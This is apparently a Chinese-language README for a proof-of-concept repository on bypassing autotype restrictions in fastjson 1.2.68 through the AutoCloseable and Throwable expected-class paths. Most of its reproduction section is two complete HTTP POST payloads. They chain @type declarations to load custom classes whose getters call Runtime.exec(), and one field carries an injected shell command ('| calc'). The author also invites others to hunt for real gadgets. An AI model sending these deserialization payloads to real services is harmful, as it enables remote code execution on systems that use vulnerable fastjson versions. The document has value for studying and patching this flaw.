## fastjson-bypass-autotype-1.2.68
fastjson因为exceptClass期望类的特性导致可以通过AutoCloseable和Throwable绕过autotype。

## 复现
运行`org.chabug.fastjson.DemoApplication`，访问localhost:8082/json

AutoCloseable绕过
```text
POST /json HTTP/1.1
Host: test.local:8082
Connection: close
Content-Type: application/json
Content-Length: 131

{
  "@type":"java.lang.AutoCloseable",
  "@type": "org.chabug.fastjson.exploit.ExecCloseable",
  "domain": "y4er.com | calc"
}
```
Throwable绕过
```text
POST /json HTTP/1.1
Host: test.local:8082
Connection: close
Content-Type: application/json
Content-Length: 127

{
  "@type":"java.lang.Exception",
  "@type": "org.chabug.fastjson.exploit.ExecException",
  "domain": "y4er.com | calc"
}
```

## 说明
用到的`org.chabug.fastjson.exploit.ExecException`和`org.chabug.fastjson.exploit.ExecCloseable`都是我自己写的，在其getter中实现了`Runtime.getRuntime().exec()`，真正要利用还是得自己找到可用的gadget。

另外浅蓝师傅、Kingkk师傅以及l1nk3r师傅的文章中已经说的很明白了，走JNDI注入困难，找找写文件什么的还行，**我也还在寻找gadget的过程中，欢迎师傅们加我一起交流**。

## 参考
1. https://github.com/iSafeBlue/fastjson-autotype-bypass-demo
2. https://b1ue.cn/archives/348.html
3. https://b1ue.cn/archives/382.html
4. [浅谈下Fastjson的autotype绕过](https://www.kingkk.com/2020/06/%E6%B5%85%E8%B0%88%E4%B8%8BFastjson%E7%9A%84autotype%E7%BB%95%E8%BF%87/)
5. https://forum.90sec.com/t/topic/1115